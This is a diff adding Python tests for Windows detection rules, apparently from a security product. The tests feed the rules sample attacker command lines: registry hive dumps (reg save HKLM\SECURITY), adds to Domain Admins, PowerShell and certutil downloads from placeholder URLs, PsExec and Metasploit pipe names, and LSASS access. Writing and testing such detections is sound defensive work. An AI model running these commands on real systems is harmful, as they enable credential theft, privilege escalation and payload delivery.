@@ -291,3 +291,91 @@ def test_wmic_recon_rule_matches_queries_not_process_create():
     assert query.search("wmic useraccount list full")
     assert not query.search("wmic process call create calc.exe")
 
+
+
+def test_sam_hive_dump_covers_the_security_hive():
+    rule = _rule_by_name(_baseline_rules(), "Plasma SAM Hive Dump")
+    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
+    sam = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$sam"))
+    assert img.search(r"C:\Windows\System32\reg.exe")
+    assert sam.search("reg save HKLM\\SYSTEM C:\\Temp\\sys")
+    assert sam.search("reg save HKLM\\SECURITY C:\\Temp\\sec")
+    assert not sam.search("reg export HKLM\\SOFTWARE C:\\Temp\\soft")
+
+
+def test_privileged_group_add_handles_quoted_names():
+    rule = _rule_by_name(_baseline_rules(), "Plasma Privileged Group Add")
+    add = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$add"))
+    assert add.search('net localgroup "Domain Admins" jdoe /add /domain')
+    assert add.search('net localgroup "administrators" jdoe /add')
+    assert not add.search('net localgroup "Users" jdoe /add')
+
+
+def test_pipe_rule_covers_psexesvc_and_metasploit():
+    rule = _rule_by_name(_baseline_rules(), "Plasma Suspicious Named Pipe")
+    pipe = _match_expr(rule["Matches"][0])
+    assert pipe.search("\\psexesvc\\PSEXESVC")
+    assert pipe.search("\\MSSE-1337-server")
+    assert pipe.search("\\paexec\\svc")
+    assert not pipe.search("\\bleep\\bloop")
+
+
+def test_masquerade_deeper_system32_path_fires():
+    # The spool\drivers\color drop path is inside System32 but is not the
+    # system directory itself: a system-binary name there must still fire.
+    rule = _rule_by_name(_baseline_rules(), "Plasma Masqueraded System Binary")
+    assert _masquerade(rule, r"C:\Windows\System32\spool\drivers\color\svchost.exe") is True
+    assert _masquerade(rule, r"C:\Windows\SysWOW64\deep\nested\lsass.exe") is True
+    assert _masquerade(rule, r"C:\Windows\servicing\svchost.exe") is False
+
+
+def test_powershell_download_aliases_and_url_anchor():
+    rule = _rule_by_name(_baseline_rules(), "Plasma PowerShell Download")
+    expr = _match_expr(rule["Matches"][0])
+    assert expr.search("iwr http://203.0.113.9/x.ps1 -OutFile C:\\Temp\\x.ps1")
+    assert expr.search("wget https://example.invalid/payload")
+    assert expr.search("$c = New-Object Net.WebClient")
+    # Package managers quoting a variable URL are not a download alert.
+    assert not expr.search("Invoke-WebRequest $url")
+
+
+def test_certutil_covers_slash_flags_and_verifyctl():
+    rule = _rule_by_name(_baseline_rules(), "Plasma LOLBin Certutil")
+    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
+    url = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$url"))
+    assert url.search("certutil /urlcache /split /f http://x C:\\p.exe")
+    assert url.search("certutil -verifyctl -f http://x C:\\p.exe")
+    assert url.search("certutil /decode in out")
+    assert img.search(r"C:\Windows\System32\certutil.exe")
+    assert not url.search("certutil -hashfile a b")
+
+
+def test_service_registry_covers_controlset001_and_stays_anchored():
+    rule = _rule_by_name(_baseline_rules(), "Plasma Service Registry Persistence")
+    svc = _match_expr(rule["Matches"][0])
+    assert svc.search(r"HKLM\System\ControlSet001\Services\Evil\ImagePath")
+    assert svc.search(r"HKLM\System\CurrentControlSet\Services\Evil")
+    assert not svc.search(r"HKLM\System\CurrentControlSet\Control\Lsa")
+    # A value deep below a service key is not the service itself.
+    assert not svc.search(r"HKLM\System\ControlSet003\Services\Evil\Parameters\Nested")
+
+
+def test_execution_from_user_paths_covers_programdata_and_roaming():
+    rule = _rule_by_name(_baseline_rules(), "Plasma Execution From User Paths")
+    img = _match_expr(rule["Matches"][0])
+    assert img.search(r"C:\ProgramData\update.exe")
+    assert img.search(r"C:\Users\bob\AppData\Roaming\drop\tool.exe")
+    assert img.search(r"C:\Users\bob\AppData\Local\6f2a1\svchost.exe")
+    assert not img.search(r"C:\Program Files\App\app.exe")
+
+
+def test_lsass_access_allows_credential_scanners_and_crash_dumps():
+    rule = _rule_by_name(_baseline_rules(), "Plasma LSASS Access")
+    target = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$target"))
+    access = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$access"))
+    caller = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$caller"))
+    assert target.search(r"C:\Windows\system32\lsass.exe")
+    assert access.search("0x1fffff")
+    assert caller.search(r"C:\Windows\System32\WerFault.exe")
+    assert caller.search(r"C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe")
+    assert not caller.search(r"C:\Temp\rundll32.exe")
